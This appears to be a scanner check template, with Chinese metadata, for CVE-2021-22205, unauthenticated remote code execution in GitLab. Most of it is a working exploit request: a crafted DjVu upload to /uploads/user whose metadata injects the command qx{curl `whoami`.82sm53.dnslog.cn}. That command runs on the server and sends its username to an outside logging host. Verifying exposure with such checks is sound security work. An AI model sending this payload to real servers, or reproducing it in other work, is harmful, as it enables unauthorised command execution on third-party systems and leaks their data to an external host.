app: GitLab
query: body:"GitLab"
meta:
  name: CVE-2021-22205 GitLab 未授权RCE
  level: 4
  tags:
    - remote_code_execution
    - ultra_vires
  description: 由于GitLab存在未授权的端点，导致该漏洞在无需进行身份验证的情况下即可进行利用，社区版(CE)和企业版(EE)皆受影响。
  homepage: https://about.gitlab.com/
  author: 一曲成殇
  references: https://www.cnblogs.com/cn-gov/p/15490588.html
  solution: 升级官方版本
  steps:
    verify_steps:
      type: and
      verify:
        - request:
            method: POST
            path: /uploads/user
            redirect: true
            header:
              - Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5
            params: "\\r\\n------WebKitFormBoundaryIMv3mxRg59TkFSX5\\r\\nContent-Disposition:
            form-data; name=\\\"file\\\"; filename=\\\"test.jpg\\\"\\r\\nContent-Type:
            image/jpeg\\r\\n\\r\\nAT&TFORM\\x00\\x00\\x03\\xafDJVMDIRM\\x00\\x00\\x00.\\x81\\x00\\x02\\x00\\x00\\x00F\\x00\\x00\\x00\\xac\\xff\\xff\\xde\\xbf\\x99
            !\\xc8\\x91N\\xeb\\x0c\\x07\\x1f\\xd2\\xda\\x88\\xe8k\\xe6D\\x0f,q\\x02\\xeeI\\xd3n\\x95\\xbd\\xa2\\xc3\\\"?FORM\\x00\\x00\\x00^DJVUINFO\\x00\\x00\\x00\\n\\x00\\x08\\x00\\x08\\x18\\x00d\\x00\\x16\\x00INCL\\x00\\x00\\x00\\x0fshared_anno.iff\\x00BG44\\x00\\x00\\x00\\x11\\x00J\\x01\\x02\\x00\\x08\\x00\\x08\\x8a\\xe6\\xe1\\xb17\\xd9\x7F*\\x89\\x00BG44\\x00\\x00\\x00\\x04\\x01\\x0f\\xf9\\x9fBG44\\x00\\x00\\x00\\x02\\x02\\nFORM\\x00\\x00\\x03\\x07DJVIANTa\\x00\\x00\\x01P(metadata\\n\\t(Copyright
            \\\"\\\\\\n\\\" . qx{curl `whoami`.82sm53.dnslog.cn} . \\\\\\n\\\" b \\\")
            )                                                                                                                                                                                                                                                                                                                                                                                                                                     \\n\\r\\n------WebKitFormBoundaryIMv3mxRg59TkFSX5--\\r\\n\\r\\n"
          response:
            - name: body
              value: Failed to process image
              type: contains
  create_at: "2021-11-10 10:30:22"
